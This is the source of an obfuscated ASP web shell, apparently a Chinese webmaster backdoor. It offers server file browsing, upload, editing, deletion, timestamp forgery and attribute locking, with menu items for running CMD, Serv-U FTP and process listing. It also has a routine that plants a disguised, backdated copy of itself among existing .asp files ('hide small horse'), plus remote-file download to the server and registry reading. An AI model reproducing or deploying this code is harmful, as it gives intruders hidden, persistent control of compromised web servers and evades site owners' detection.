<%@LANGUAGE="VBSCRIPT"%>
<%
On Error Resume Next
server.scripttimeout=600
response.buffer=true
Response.Expires=-1
Session.Timeout=60
Const phg="dfz|eoz|fbn|fom|vrn|tve|rmq|jbw|pjz|puf|cjn|ltv|qsx|npv|tyg|zen|rpu|sqdb|kbsl|newwf"
Const joy=true
Const xlg=33
Const wnb="login"
Const pxx="GB2312"
Const kxy="_"
Const xky="want_pre.asp"
Const gxj=False
Const nnb="|asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config|"
'<!
Const cwo="_request_send_sumbit_include_reel_open_form_month_data"
'!>
public  br,klj,ozs,zde,tjn
zde=0
dim login,qgj,edg,kiq,ict,cl,kxi,rqd,dfz,ecu,kyv,phe,eoz,fbn,fom,wzp,wcv,xyw,bmf,puu,gwa,cut,zeo,kyt,bkk,xjl,pht,aao,lfy,vrn,pvr,gjy,tve,rmq,jbw,pjz,puf,cjn,ddt,wzr,qfy,ltv,qsx,oyt,kxk,lhg,T1,iph,waa,amg,byv,rph,epg,yuh,rpj,npv,tyg,zen,rpu,syg,naz,ptw,rqf,yiq,smp,xlh,mt,qed,giq,dfy,uuf,cve,bkv,bxj,dsz,bki,gkl,syr,apv,xip,wnn,ndt,sxv,drm,gwk,vdd,qqs,dqs,mrp,kwk,icu,roy,mro,zqr,noy,yfj,zfl,iqf,lgh,fkv,rzd,epf,jmd,gjn,ctj,alu,rzq
sheitle="版权"
kxi=oys("url")
rqd=oys("local_addr")
kyv=server.mappath(".")
phe=server.mappath("/")
xyw=Clng("&H0")
for i=0 to 8
ecu=ecu&"#"&right("000000"&trim(hex(xyw)),6)&","
if i mod 2 = 0 then xyw=xyw+1118481+1118481
next
colors=ecu&"#ccFFcc,#ccFFcc,#ccFFcc,#ccFFcc,#FFFFFF,#f44444,#00FF00,#f00000"
'colors=ecu&"#33FF00,#f44444,#00FF00,#f00000"
colors="#000000,#111111,#222222,#333333,#444444,#555555,#666666,#444444,#888888,#999999,#bbbbbb,#cccccc,#cccccc,#FFFFFF,#f44444,#00FF00,#f00000"
colors="#000000,#003000,#006300,#006300,#000000,#33FF00,#000000,#448844,#888888,#999999,#00dd00,#00dd00,#00dd00,#00ff00,#f44444,#00FF00,#f00000"
'j colors
cl=split(colors,",")
wzr="<hr>"
kiq="<font color='"&cl(15)&"'><b>√</b></font>"
ict="<font color='"&cl(16)&"'><b>×</b></font>"
Set objRe=new RegExp
objRe.Global=True
objRe.IgnoreCase=True
objRe.MultiLine=True
puu="<title>"&sheitle&" - "&rqd&" </title><style type='text/css'>body{border:0;margin:0;table-layout:fixed;color:"&cl(13)&";font-size:12px;word-break:break-all;background:"&cl(0)&";SCROLLBAR-face-COLOR:"&cl(4)&";crollbar-arrow-color:"&cl(5)&";scrollbar-highlight-color:"&cl(2)&";scrollbar-3dlight-color:"&cl(5)&";scrollbar-shadow-color:"&cl(5)&";overflow:auto;}tr{background-color:"&cl(2)&";padding:2px;}tr,td{margin-top:5px;color:"&cl(10)&";font-size:12px; border-bottom:1px solid "&cl(0)&";}.radio{background:;}form{margin:0;padding:0;}input,select{border-color:"&cl(11)&";background:"&cl(6)&";color:"&cl(13)&";font:12px Arial,Tahoma;}textarea{border-color:"&cl(11)&";background:"&cl(6)&";color:"&cl(13)&";font:12px Arial,Tahoma;padding:3px 5px 5px 5px;SCROLLBAR-face-COLOR:"&cl(4)&";scrollbar-arrow-color:"&cl(5)&";scrollbar-highlight-color:"&cl(0)&";scrollbar-3dlight-color:"&cl(5)&";scrollbar-shadow-color:"&cl(4)&";overflow:auto;}h2{margin:0;padding:0;height:20px;line-height:20px;font-size:12px;color:"&cl(13)&";}h3{background:"&cl(0)&";margin:0;padding:0;height:30px;line-height:30px;font-size:12px;color:"&cl(13)&";}u{text-decoration: none;color:"&cl(7)&";float:left;display:block;width:50%;margin-right:10px;}a{color: "&cl(12)&";text-decoration:none;}a:hover{color: "&cl(14)&";text-decoration:none;}.fixSpan{overflow: hidden;white-space: nowrap;text-overflow: ellipsis;vertical-align: baseline;}.button{overflow:visible;padding:0px;width:0;height=25px;}</style><script>function xti(str){return str.charCodeAt();}function csj(lie){if(lie==''){return lie;}else{var tt='';cgg='';tmpaci='';for(var i=0;i<lie.length;i++){cgg=lie.substr(i,1);tmpaci=cgg.charCodeAt();if(128>tmpaci>0){cgg=tmpaci+"&xlg&";}tt+=cgg+'"&kxy&"';}return tt.substr(0,tt.length-1);}}function alt(id){return document.getElementById(id);}function tgt(cie){var pamarr;pamarr='"&phg&"'.split('|');for(var i in pamarr){try{alt(pamarr[i]).value=alt(pamarr[i]+'1').value;alt(pamarr[i]).value=csj(alt(pamarr[i]).value);}catch(e){}}alt(cie).submit();}function uqd(cie,txl){var vala=alt(cie).eoz;var valb=alt(cie).folderpath_x;if(txl==''){vala.value=csj(valb.value);valb.value='g';}else{vala.value=csj(txl);}alt(cie).submit();}function uct(cwa,filename){if(cwa=='db'){alt('rmq').value=csj(filename);alt('db').submit();}else{alt('qgj').dfz.value=csj(cwa);alt('qgj').fbn.value=csj(filename);alt('qgj').submit();}}</script>"
br=chr(13)&chr(10)
edg=split("Scripti"&ihk&"ng.FileS"&nuj&"ystemObject#WScri"&jse&"pt.S"&afd&"hell#WScri"&jse&"pt.Sh"&xoc&"ell.1#Sh"&xoc&"ell.App"&vvi&"lication#Sh"&xoc&"ell.App"&vvi&"lication.1#WScri"&jse&"pt.Network#Sh"&xoc&"ell.Users#Ad"&ifc&"odb.St"&lzw&"ream#Microsoft.XMLHT"&kqx&"TP#MS"&mkr&"XML2.XMLHT"&kqx&"TP#hzhost.modules#Scripti"&ihk&"ng.Dictionary#Ad"&ifc&"odb.Connec"&xdz&"tion#ADOX.Catalog#JRO.JetEngine#Ad"&ifc&"odb.Re"&bcy&"cordSet#SoftA"&ynt&"rtisans.File"&pns&"Up#LyfUpload.UploadFile#Persi"&xnr&"ts.Upload.1#JMail.SmtpMail#CDONTS.NewMail#SmtpMail.SmtpMail.1","#")
sub fjj(str)
execute str
end sub
sub bys()
Set uuf=khe(edg(1))
If Not IsObject(uuf)Then Set uuf=khe(edg(2))
end sub
Function khe(sbz)
Set khe=server.createObject(sbz)
End Function
function dci(str,tmg)
if str<>"" then str="alert('"&str&"');"
str=replace(str,vbCrLf,"")
nxh str&iif(tmg=0,"window.location.href=document.referrer;","history.go(-"&tmg&");")
end function
sub ept()
Response.Flush
end sub
Function oys(str)
oys=Request.ServerVariables(str)
End Function
function zph(str)
zph=xwl(request(str))
end function
Sub j(str)
response.write(str)
End Sub
function cvp(ztj,oxy)
cvp=drb("javascript:uqd(""hf"","""&ohp(ztj)&""")","target='_parent'",oxy)
end function
function inw(zep,iqu,kja)
inw=drb("javascript:uct("""&zep&""","""&ohp(iqu)&""")","",kja)
end function
function xva(dgy,api,sac)
xva=drb("javascript:uct("""&sac&""","""&ohp(dgy)&""")","class='am' onclick='javascript:return confirm(""确定删除  "&api&""")'","删除")
end function
Function ohp(str)
ohp=Replace(str,"\","\\")
ohp=Replace(ohp,".","\.")
ohp=Replace(ohp,"?","\?")
ohp=Replace(ohp,"+","\+")
ohp=Replace(ohp,"(","\(")
ohp=Replace(ohp,")","\)")
ohp=Replace(ohp,"*","\*")
ohp=Replace(ohp,"[","\[")
ohp=Replace(ohp,"]","\]")
End Function
Function csj(lie)
If Not joy Or lie=""Then
csj=lie
Exit Function
End If
Dim tt,cgg
tt=""
For i=1 To Len(lie)
cgg=Mid(lie,i,1)
If Asc(cgg)<128 And Asc(cgg)>0 Then
tt=tt&Asc(cgg)+xlg&kxy
Else
tt=tt&cgg&kxy
End If
Next
csj=Left(tt,Len(tt)-1)
End Function
Function vzc(str,xze)
objRe.Pattern=xze
vzc=objRe.Test(str)
End Function
Function xwl(vfa)
If Not joy Or vfa="" Or Not vzc(vfa,"^((\d+|.)"&kxy&")+(\d+|.)$")Then
xwl=vfa
Exit Function
End If
Dim dd,xvp
dd=""
xvp=Split(vfa,kxy)
For i=0 To UBound(xvp)
If IsNumeric(xvp(i))Then
dd=dd&Chr(CInt(xvp(i))-xlg)
Else
dd=dd&xvp(i)
End If
Next
xwl=dd
End Function
function dov(s)
if not isnull(s) then
s=replace(s,">","&gt;")
s=replace(s,"<","&lt;")
s=replace(s,chr(39),"&#39;")
s=replace(s,chr(34),"&quot;")
s=replace(s,chr(20),"&nbsp;")
dov=s
end if
end function
function bwy(t):bwy=" "
'<!
dim f_s,f_t,f_w
f_w="webdings"
select case t
case "1"
f_w="wingdings":f_s=3:f_t="1"
case "2"
f_w="wingdings":f_s=3:f_t="&#200;"
case "0","8"
f_w="wingdings":f_s=3:f_t="0"
case "asp","asa","cer","cdx" 
f_s=4:f_t="&#166;"
case "3"
f_w="wingdings":f_s=2:f_t="&#232;"
case "4"
f_w="wingdings":f_s=3:f_t="&#238;"
case "aspx"
f_s=4:f_t="&#157;"
case "jsp"
f_s=4:f_t="&#158;"
case "html","shtml","htm"
f_s=4:f_t="&#155;"
case "jpg","gif","png","bmp"
f_s=4:f_t="&#156;"
case "txt","inc","config"
f_s=4:f_t="&#165;"
case "css"
f_s=4:f_t="&#162"
case "php"
f_s=4:f_t="&#202;"
case "t"
f_s=2:f_t="8"
case "js"
f_w="wingdings":f_s=4:f_t="O"
case "exe","com","bat"
f_w="wingdings":f_s=4:f_t="&#255;"
case "rar","zip","7z"
f_s=4:f_t="&#144;"
case "db","mdb"
f_s=4:f_t="&#168;"
case else
f_s=4:f_t="&#163;"
end select
bwy="<font face="&f_w&" size="&f_s&">"&f_t&"</font> "
'!>
end function 
function drb(a,b,c)
drb="<a href='"&a&"' "&b&">"&c&"</a>"
end function
function zna()
ysx"hf",kxi,"":axu"eoz","",0:vnz
xjl=iif(zph("eoz")="","rzp","njv")
bub"100%"" height=""100%"" class=""menu"
oiz 4
j"<td height='32' valign='top'>"
jkv
tez 4
azn 60,"<h2>地址栏：</h2>"
azn"'% height='40",qoi("eoz1","text|100%",session("eoz"))
azn 10,qoi("^:tgt('hf')","button","GO")
cda
mnk
oiz 4
azn"","<iframe name='fileframe' src='?dfz="&xjl&"' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
cda
end function
function mnk()
on Error Resume Next
ysx"qgj",kxi,"fileframe":axu"dfz","",0:axu"fbn","",0:vnz
jkv
tez 2
azn"'% height='30'c",cvp(phe,b("WEB根目录"))
azn"c",cvp(kyv,b("本程序目录"))
'<!
azn"c",inw("cdn","",b("功能一"))
azn"c",inw("mdr","",b("功能二"))
azn"c",inw("nib","",b("数据库操作"))
azn"c",inw("cfv","",b("执行CMD"))
azn"c",inw("znw","",b("用户进程"))
azn"c",inw("omg","",b("Ser"&xng&"v-U Ftp"))
azn"c",inw("tvp","",b("隐藏小马"))
'!>
azn"c",drb(kxi,"target=_top",b("欢迎界面"))
azn"c",inw("logout","",b("退出"))
cda
end function
class llbf
dim cf
sub class_initialize
set cf=khe(edg(0))
end sub
sub class_terminate
set cf=nothing
end sub
'<!
function mov(c)
On Error Resume Next
dim xvb,e
xvb="\Program Files,\Documents and Settings\All Users,\Documents and Settings\All Users\「开始」菜单\程序,\recycler,\wmpub,\WINDOWS,\WINDOWS\Temp,\Program Files\RhinoSoft.com,\Program Files\ServU,\php,\Program Files\Microsoft SQL Server,\docume~1\alluse~1\Application Data\Symantec\pcAnywhere,\Documents and Settings\All Users\桌面,\documents and settings\All Users\Application Data\Microsoft\Media Index"
for each c in cf.drives
for each a in split(xvb,",")
e=c&a
if cf.folderexists(e) then tez 0:azn"",drb("javascript:uqd(""hf"","""&ohp(e)&""")","target='_parent' title='"&e&"'","【"&left(e,1)&"】【"&qaj(e,"\")&"】")
next
next
end function
'!>
function nzd(m)
On Error Resume Next
for each d in cf.drives
if m=0 then oiz 1:azn"",cvp(d&"\","磁盘&nbsp;&nbsp;("&d.driveletter&":)")
next
end function
function ggr(wzp,gjo)
ggr=cf.getparentfoldername(wzp)
if ggr="" then ggr=wzp
ozs=ggr
if gjo="" then gjo="【返回】"
ggr=cvp(ggr,dbi(gjo))
end function
function leb(fbn)
if instr(fbn,phe) then
leb=replace(fbn,phe,"")
leb=replace(leb,"\","/")
if left(leb,1)<>"/" then leb="/"&leb
leb=drb(leb,"class='am' target='_blank'","打开")
else
leb="&nbsp;"
end if
end function
function bxv(wzp)
ysx"qgj",kxi,"filelist":axu"dfz","",0:axu"fbn","",0:axu"newwf","",0:vnz
ysx"db",kxi,"_parent":axu"dfz","","nib":axu"theAct","","rku":axu"param","","":axu"rmq","","":vnz
wzp=dov(wzp)
set fold=cf.getfolder(wzp)
if right(wzp,1)<>"\" then wzp=wzp&"\"
jkv
for each f in fold.subfolders
fdername=dov(f.name)
oiz 0
azn 10,bwy(0)
azn"",cvp(wzp&fdername,fdername)
azn 70,"&nbsp;"
azn 70,nxu(2,wzp&fdername,f.Attributes)
azn 160,iif(datediff("d",f.datelastmodified,now())=0,dbi(f.datelastmodified),f.datelastmodified)
azn 40,"&nbsp;"
azn 40,"&nbsp;"
azn 40,inw("zlz",wzp&fdername,"复制")
azn 40,inw("aum",wzp&fdername,"移动")
azn 40,xva(wzp&fdername,fdername&"&nbsp;及其子目录和文件","swy")
azn 40,"&nbsp;"
next
for each l in fold.files
filename=dov(l.name):bhq=filename
ysm=wzp&filename
if jww(filename,".",false)="index" or jww(filename,".",false)="default" then bhq=dbi(bhq)
oiz 1
azn 10,bwy(LCase(qaj(filename,".")))
azn"",inw("mbh",ysm,bhq)
azn 70,clng(l.size/1024)&"k"
azn 70,nxu(1,ysm,l.Attributes)
azn 160,iif(datediff("d",l.datelastmodified,now())=0,dbi(l.datelastmodified),l.datelastmodified)
azn 40,leb(ysm)
azn 40,inw("csw",ysm,"编辑")
azn 40,inw("vik",ysm,"复制")
azn 40,inw("ejh",ysm,"移动")
azn 40,xva(ysm,filename,"eye")
azn 40,inw("db",ysm,"数据库")
next
cda
set fold=nothing
end function
function njv(wzp)
dim bmp,eab,lup,wme,ysm,bhq
ysx"hf",kxi,"_parent":axu"eoz","",0:vnz
ysx"qgj",kxi,"filelist":axu"dfz","",0:axu"fbn","",0:axu"newwf","",0:vnz
bub"100%"" height=""100%"
tez 3
j"<td width='200px' align='center' style='background-color:"&cl(0)&"'><div style='overflow-y:auto;height:100%;'>"
bub"95%"
nzd 0
oiz 1:azn"",cvp(phe,"站点根目录")
oiz 1:azn"",cvp(kyv,"本程序目录")
'<!
mov(d)
'!>
cda
j"</td><td>"
bub"100%"" height=""100%"
j"<tr style='padding:0px;'><td height='10' style='border-bottom:0px;'>"
jkv
tez 4
pea
'<!
azn 120,"&nbsp;"&qoi("^:uct('bjx','')","button","打包当前目录")
'!>
tus wzp
cda
j"</td><tr style='padding:0px;'><td>"
bub"100%"" height=""100%"
tez 2:azn"'% colspan='2",b("名称")
azn 70,b("大小"):azn 70,b("属性"):azn 160,b("修改时间"):azn 40,"&nbsp;":azn 40,"&nbsp;":azn 40,"&nbsp;":azn 40,b("操作"):azn 40,"&nbsp;":azn 40,"&nbsp;":azn 14,"&nbsp;"
oiz 0
azn"'% colspan='13",bwy(0)&ggr(wzp,"..")
j"<tr style='padding:0px;'>"
azn"'% height='100%' colspan='13","<iframe name='filelist' id='filelist' src='?dfz=bxv' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>"
cda
j"</td>"
cda
end function
function pea()
On Error Resume Next
if newwf<>"" then
cf.createfolder session("eoz")&newwf
dci iif(err>0,Err.Description,""),0
else
nxh"qgj.dfz1.value='csw'"
azn 60,"<h2>"&bwy("t")&"新建:</h2>"
azn 50,tfw("creattype^:qgj.dfz1.value='csw'",0,"csw",1=1,0)&"文件"
azn 50,tfw("creattype^:qgj.dfz1.value='pea'",0,"pea",1,0)&"目录"
azn 200,qoi("newwf1","text","New")
azn 10,qoi("^:if(qgj.dfz1.value=='pea'){qgj.target='';}tgt('qgj');","button","创建")
end if
end function
function nxu(ty,wzp,num)
hz="-":if num>=32 then hz="A"
select case num
case 0,16,32,2,18,34 nxu="x"
case else nxu="v"
end select
if nxu="v" then
nxu=drb("javascript:uct(""ibl"",""v"&ty&"@"&ohp(wzp)&""")","class='am' title='解锁'","属性")&"<font face='webdings' size='1' color="&cl(16)&">x</font>"&num
else
nxu=drb("javascript:uct(""ibl"",""x"&ty&"@"&ohp(wzp)&""")","class='am' title='加锁'","属性")&"√"&num
end if
end function
function swy(wzp) 
On Error Resume Next
if cf.folderexists(wzp) then
cf.deletefolder wzp
dci Err.Description,iif(err,2,0)
end if
end function
function eye(wzp)
On Error Resume Next
if cf.fileexists(wzp) then
cf.GetFile(wzp).attributes=0
cf.deletefile wzp
dci Err.Description,iif(err,2,0)
end if
end function
Function mbh(wzp)
Response.Clear
dim ibi
Set ibi=khe(edg(7))
ibi.Open
ibi.Type=1
ibi.LoadFromFile wzp
sz=InstrRev(wzp,"\")+1
Response.AddHeader "Content-Disposition","attachment; filename="&Mid(wzp,sz)
Response.AddHeader "Content-Length",ibi.Size
Response.CodePage=65001
Response.ContentType="application/octet-stream"
Response.BinaryWrite ibi.Read
ept
ibi.Close
Set ibi=Nothing
End Function
function tus(wzp)
on Error Resume Next
dim nmb,xhp,ths,nan,dea,zbj
if request("gjy")<>"post" then
ysx"upl",kxi&"?dfz=tus&gjy=post"" enctype=""multipart/form-data",""
if session("ufi")<>"" then
azn"c",iif(leb(session("ufi"))="&nbsp;",session("ufi"),b(replace(leb(session("ufi")),"打开",session("ufi"))))&"&nbsp;&nbsp;"&cvp(session("eoz"),dbi("【返回】"))'drb("javascript:history.go(-2);location.reload();","",dbi("【返回】"))
else
azn 60,"<h2>"&bwy("t")&"上传:</h2>"
azn"",qoi("bd1f^;re1n.value=this.value.split('\\')[this.value.split('\\').length-1]","file|100%",0)&qoi("os1p","",replace(session("eoz"),"\\","\"))
azn 160,qoi("re1n","text","重命名")
azn"40",qoi("^:tgt('upl')","button","上传")
end if
vnz
session("ufi")=""
else
Set u=new UUPC
Set f=U.UA("bd1f")
UName=replace(session("eoz")&U.form("re1n"),"\\","\")
If UName="" Or f.pxm=0 then
dci"请输入上传的完全路径后选择一个文件上传!",0
Else
f.tsj UName
If Err.number=0 Then
session("ufi")=UName
dci"",0
else
nxh"alert('上传失败\n错误原因："&Err.Description&"\n检查是否有写权限!');window.history.go(-1);"
end if
End If
set f=nothing
set u=nothing
end if
end function
function xub(obn,wzp)
On Error Resume Next
err.clear
Set qfy=khe(edg(3))
If Not IsObject(qfy)Then Set qfy=khe(edg(4))
if obn<>"" And IsDate(obn) then qfy.NameSpace(jww(wzp,"\",False)).ParseName(qaj(wzp,"\")).ModIfyDate=obn
set qfy=nothing
if err.number=0 then
xub="文件最后修改时间为："&obn
else
xub="修改时间失败"
end if
end function
function mqd(wzp,w)
On Error Resume Next
if w<>"" then cf.GetFile(wzp).attributes=w
mqd=cf.GetFile(wzp).attributes
err.clear
end function
function csw(wzp)
wzp=fbn
if wzp="" then wzp=newwf:gjy="new"
dim tuf
if char="" then char="gb2312"
if gjy="post" then
set t=khe(edg(7))
With t
.Type=2
.mode=3 
.open 
.charset=char
.WriteText thecontent
.SaveToFile wzp,2 
.Close 
End With
set t=nothing
drm=drm
if filesafe="1" then drm=7
if drm="" then drm=32
if clng(mqd(wzp,drm))<>clng(drm) then tuf=dbi("修改文件属性失败 ")
j"<center>"
p:p:p
j"文件保存成功！"&tuf&"文件当前属性为："&mqd(wzp,"")
p:p:j xub(lastmodified,wzp)
p:p:j replace(leb(wzp),"打开",dbi("【打开】"))&drb("javascript:history.go(-1);","",dbi("【返回】"))&ggr(wzp,"【刷新】")
j"</center>"
response.end
end if
if wzp<>"" then
if instr(wzp,session("eoz"))=0 then wzp=session("eoz")&wzp
if cf.fileexists(wzp) then
drm=mqd(wzp,"")
mqd wzp,0
set t=khe(edg(7))
With t
.Type=2
.mode=3 
.open
.charset=char
.loadfromfile wzp
txt=Replace(.ReadText(),Chr(0)," ")
.Close 
End With
set t=nothing 
end if
end if
if gjy="new" then
lrm"新建文件"
txt=thecontent
else
lrm"编辑文件"
end if
jkv
tez 3
j"<td valign='top' align='center'>"
axu"fbn1","text",wzp
ysx"tttf",kxi,""
axu"gjy","",gjy
axu"dfz","","csw"
axu"drm","",drm
axu"fbn","",wzp
j"<textarea name='thecontent' style='width:100%;' rows='25'>"&txt&"</textarea><br>"
j"<hr>"
j"加锁："
tfw"filesafe",1,1,1,1
j" 修改日期:"
gwk=now()
if cf.fileexists(wzp) then gwk=cf.getfile(wzp).datelastmodified
axu"lastmodified","text|150",gwk:j"&nbsp;&nbsp;&nbsp;"
axu"goback^:history.back()","button","返回":j"&nbsp;&nbsp;&nbsp;"
axu"reset","reset","重置":j"&nbsp;&nbsp;&nbsp;"
axu"^:gjy.value='post';tgt('tttf')","button","保存":j"&nbsp;&nbsp;&nbsp;"
tfw"char^:tgt('tttf')",0,"gb2312",char="gb2312",1
j"gb2312"
tfw"char^:tgt('tttf')",0,"utf-8",char="utf-8",1
j"utf-8"
vnz
j"</td></tr></table>"
end function
function zqp(fbn,olk)
dim zro,lhf,bxi
zro=iif(olk mod 2=0,"移动","复制"):lhf="文件"&iif(olk>2,"夹","")
lrm zro&lhf
if fom="" then
div "将"&zro&" "&pel(fbn)&" "&lhf&"到",3
azn"",qoi("fbn1","",fbn)&qoi("fom1","text",fbn)
ysx"ff","",""
axu"dfz","","zqp"
axu"gjy","","post"
axu"fbn","",0
axu"fom","",0
axu"olk","",olk
azn 10,qoi("^:tgt('ff');","button",zro)
vnz
else
select case olk
case 1
cf.copyfile fbn,fom
case 2
cf.movefile fbn,fom
case 3
cf.copyfolder fbn,fom
case 4
cf.movefolder fbn,fom
end select
j"<center><br><br><br>"&lhf&" "&fbn&" 成功"&zro&"到 "&fom&drb("javascript:history.go(-2);","",dbi("【返回】"))&ggr(fom,"【刷新】")&"</center>"
end if
end function
function ibl(wzp)
dim zok,xhe
zok=left(split(wzp,"@")(0),1)
xhe=right(split(wzp,"@")(0),1)
wzp=split(wzp,"@")(1)
if xhe=1 then Set thisfile=cf.GetFile(wzp)
if xhe=2 then Set thisfile=cf.GetFolder(wzp)
if zok="v" then
thisfile.Attributes=32/xhe
else
thisfile.Attributes=7
end if
Set thisfile=Nothing
nxh("location.href=document.referrer;")
end function
'<!
function tvp(wzp)
sxv=split(cwo,"_")
n=0
bki=vao(phe)
set f=cf.OpenTextFile(oys("PATH_TRANSLATED"),1)
newtxt=f.readall
set f=nothing
objre.Pattern="'<"&"![\s\S]*?'!"&">"
newtxt=objre.replace(newtxt,"")
randomize
m=int((zde)*rnd+1)
l=int((ubound(sxv))*rnd+1)
for each x in cf.getfolder(bki).files
if right(x.name,4)=".asp" then
n=n+1
if n=m then
syr=x.name
drm=x.attributes
gwk=x.datelastmodified
end if
end if
next
objre.Pattern=xky&".+?"&vbCrLf
newtxt=objre.replace(newtxt,syr&chr(34)&vbCrLf)
vdd=iif(instr(syr,"_")>0,"_",".")
syr=jww(syr,vdd,False)&iif(vdd="_",vdd,"")&sxv(l)&".asp"
syr=bki&syr
set f=cf.OpenTextFile(syr,2,true)
f.write(newtxt)
set f=nothing
mqd syr,drm
xub gwk,syr
newurl=replace(syr,phe,"")
if left(newurl,1)<>"\" then newurl="/"&replace(newurl,"\","/")
session.Abandon()
ysx"n",newurl&"?"&wnb,"_parent":vnz:nxh"n.submit()"
Response.end
end function
function vao(wzp)
On Error Resume Next
ept
dim dgi
if right(wzp,1)<>"\" then wzp=wzp&"\"
set F=cf.getfolder(wzp)
for each x in f.Subfolders
vao wzp&x.name
next
set f=nothing
dgi=ktg(wzp)
if dgi>zde then zde=dgi:tjn=wzp
vao=tjn
end function
function ktg(wzp)
i=0
set F=cf.getfolder(wzp)
for each x in f.files
if right(x.name,4)=".asp" then i=i+1
next
set f=nothing
ktg=i
end function
sub ggh(wzp)
dim ojo,zpu
On Error Resume Next
set bmf=cf.GetFolder(wzp)
for each objFile in bmf.Files
ojo=replace(wzp&"\"&objFile.name,"\\","\")
if ojo<>"" then
if sctype="1" then
if instr(1,objFile.name,wcv,1)>0 then
bhf ojo,kxk,oyt
end if
else
if tgi(ojo,wcv,3) then
bhf ojo,kxk,oyt
end if
end if
end if
ept
next
set bmf=nothing
end sub
function tgi(filename,pwo,aee)
On Error Resume Next
dim dec
tgi=false
if pwo="" then tgi=true
dec=lastn
if dec="" then dec=nnb
if right(dec,1)<>"|" then dec=dec&"|"
if left(dec,1)<>"|" then dec="|"&dec
if instr(1,dec,"|"&cf.GetExtensionName(filename)&"|",1)>0 then
if aee=1 or aee=2 then
set t=khe(edg(7))
t.Type=2
t.mode=3 
if aee=1 then t.charset="gb2312"
if aee=2 then t.charset="utf-8"
t.open 
t.loadfromfile filename
epg=t.readtext
if instr(1,epg,pwo,1)>0 then tgi=true
t.flush 
t.Close 
set t=nothing
else
set t=cf.opentextfile(filename,1,false)
if cf.getfile(filename).size>0 then
epg=t.readall
end if
if epg<>"" then
if instr(1,epg,pwo,1)>0 then tgi=true
end if
t.close
set t=nothing
end if
end if
end function
function bhf(fcy,utl,zui)
dim txk
if right(fcy,1)="\" then txk="fo" else txk="fi"
if txk="fo" then ovb fcy,utl,zui,1
if txk="fi" then ucs fcy,utl,zui
end function
sub lfx(wzp)
On Error Resume Next
if cf.folderexists(wzp) then
set bmf=cf.GetFolder(wzp)
for each objSubFolder in bmf.Subfolders
if objSubFolder then
nowpath=replace(wzp&"\"&objSubFolder.name,"\\","\")
if right(nowpath,1)<>"\" then nowpath=nowpath&"\"
if noy="1" and yfj="1" then ggh(nowpath):ept
if yfj="1" and instr(nowpath,":") then lfx nowpath:ept
end if
err.clear
ept
next 
set bmf=nothing
end if
end sub
sub yea(usn)
ysx"qgj",kxi,"fileframe":axu"dfz","",0:axu"fbn","",0:vnz
jkv
oiz 3
azn"'% colspan='3","<h2>"&bwy("t")&"扫描结果:</h2>"
mbi
azn"",b("名称")
azn"30c",b("可读")
azn"30c",b("可写")
cda
ept
dim mcg
mcg=fbn
for each x in cf.drives
if instr(fbn,"x:\")>0 then mcg=mcg&br&replace(fbn,"x:\",x.driveletter&":\")
next
for each xx in split(mcg,br)
if usn then bhf xx,kxk,oyt
if noy="1" then ggh xx
if yfj="1" then lfx xx
ept
next
jkv
tez 0
azn"'% id='zs",""
azn"","&nbsp;"
cda
nxh"var nfo=document.getElementsByName('fo').length;var nfi=document.getElementsByName('fi').length;var total='';if(nfo!=0){total=total+'目录：'+nfo;}if(nfo!=0&nfi!=0){total=total+','}if(nfi!=0){total=total+'文件：'+nfi;}var altotal='搜索完毕,共搜到:\n'+total;if(total==''){altotal='搜索完毕\n没搜到符合条件的对象*_*'}alert(altotal);total='<b>总数: </b>'+(nfo+nfi)+'&nbsp;&nbsp;'+total;document.getElementById('zs').innerHTML=total;"
ept
end sub
function mdr()
On Error Resume Next
if lastn="" then lastn=nnb
if qs="fl" then zfl=fbn
if qs="sb" then iqf=fbn
if qs="xz" then xmyurls=fbn
if xmyurls="" then xmyurls="http://127.0.0.1/1/text1.txt|"&kyv&"\title.asp"&br&"http://127.0.0.1/2/text2.txt|"&kyv&"\title.html"&br&"http://127.0.0.1/3/text3.txt|c:\title.bat"
if zfl="" then zfl=session("eoz")
If iqf=""Then iqf="HK"&rto&"LM\SYSTEM\CurrentC"&pmj&"ontrolSet\Control\ComputerName\ComputerName\ComputerName"
jkv
tez 4
azn"'% colspan='2","<h2>"&bwy("t")&"检测注册表:</h2>"
oiz 4
ysx"chyy","","":axu"fbn","",zfl:axu"qs","","":axu"dfz","","mdr"
azn 60,"检 测 项:":azn"","<textarea name=zcbx id=zcbx rows=6 style='width:724px'>"&iqf&"</textarea>&nbsp;&nbsp;"&qoi("botton^:qs.value='sb';fbn.value=zcbx.value;tgt('chyy')","button","Go")
oiz 4
azn"'% colspan='2","<h2>"&bwy("t")&"下载到服务器:</h2>"
oiz 4
azn"","下载位置:"
azn"","<textarea name=xzsz id=xzsz rows=6 style='width:724px'>"&xmyurls&"</textarea>&nbsp;&nbsp;"&qoi("botton^:qs.value='xz';fbn.value=xzsz.value;tgt('chyy')","button","Go")
oiz 4
azn"'% colspan='2","<h2>"&bwy("t")&"文件扫描:</h2>"
oiz 4
azn 60,"目标目录:":azn"",qoi("chfl","text|760",zfl)
oiz 4
azn"","关 键 字:"
azn"",qoi("wcv","text|600",wcv)&tfw("sctype",0,1,1=1,0)&"文件名"&tfw("sctype",0,2,1,0)&"内容 "&tfw("yfj",1,1,1=1,0)&"子目录  "
oiz 4
azn"","文件类型:"
azn"",qoi("lastn","text|677",lastn)&"&nbsp;&nbsp;"&qoi("botton^:qs.value='fl';fbn.value=chfl.value;tgt('chyy')","button","开始搜索")
axu"noy","",1:axu"kxk","",1:axu"oyt","",1
cda
vnz
select case qs
case"fl"
yea false
case"sb"
bub "100%"
tez 3
azn"'% colspan='2","<h2>"&bwy("t")&"检测结果:</h2>"
oiz 4
azn"70%",b("键")
azn"30%",b("值")
cda
For Each eik In Split(fbn,br)
jcm=yqm(eik)
if err.number=0 then
jkv:tez 1
azn"70%",eik
azn"30%",jcm
cda
end if
ept
Next
bub"100%"" style=""cursor:pointer;"" onclick=""javascript:alc('doChkReg_1')"
mbi
azn 10,"<div style='width:10px;height:10px;' id='ss_1'>"&pel(bwy("3"))&"</div>"
azn"100%",b("未能读取的项目")
cda
j"<div id=""doChkReg_1"" style=""display:none;"">"
For Each eik In Split(fbn,br)
jcm=yqm(eik)
if err.number<>0 then
jkv:tez 1
azn"100%",jcm
cda
err.clear
end if
ept
Next
j"</div>"
case"xz","zx"
ysx"qgj",kxi,"fileframe":axu"dfz","",0:axu"fbn","",0:vnz
jkv
tez 3
